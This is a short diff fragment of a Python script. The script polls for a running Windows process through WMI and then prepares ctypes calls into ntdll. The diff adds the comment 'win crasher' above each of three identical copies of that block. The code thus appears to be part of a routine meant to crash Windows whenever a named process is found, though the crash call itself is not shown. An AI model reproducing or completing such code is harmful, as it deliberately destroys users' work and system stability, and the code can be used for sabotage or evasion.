@@ -17,6 +17,7 @@ while(counter < 10):
         c=wmi.WMI()
         def check_process_running(str_):
             if(c.Win32_Process(name=str_)):
+                #______________win crasher!!!!!!!!!
                 ntdll = ctypes.windll.ntdll
                 prev_value = ctypes.c_bool()
                 res = ctypes.c_ulong()
@@ -36,6 +37,7 @@ while(counter < 10):
         c=wmi.WMI()
         def check_process_running(str_):
             if(c.Win32_Process(name=str_)):
+                #______________win crasher!!!!!!!!!
                 ntdll = ctypes.windll.ntdll
                 prev_value = ctypes.c_bool()
                 res = ctypes.c_ulong()
@@ -55,6 +57,7 @@ while(counter < 10):
         c=wmi.WMI()
         def check_process_running(str_):
             if(c.Win32_Process(name=str_)):
+                #______________win crasher!!!!!!!!!
                 ntdll = ctypes.windll.ntdll
                 prev_value = ctypes.c_bool()
                 res = ctypes.c_ulong()
